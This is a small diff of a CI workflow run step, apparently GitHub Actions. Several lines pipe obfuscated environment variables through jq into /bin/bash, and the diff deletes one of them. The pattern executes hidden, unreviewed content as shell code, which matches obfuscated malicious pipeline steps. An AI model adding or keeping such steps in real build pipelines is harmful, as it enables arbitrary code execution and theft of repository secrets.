@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$pim9753" | jq -r .ovjvk00761 | /bin/bash
           echo $i17 | jq -r .drfr1 | /bin/bash
-          printf '%s' "$tpi39" | jq -r .t4 | /bin/bash
           echo $nfgh71 | jq -r .evyk6 | /bin/bash
 
       - name: Store artifact
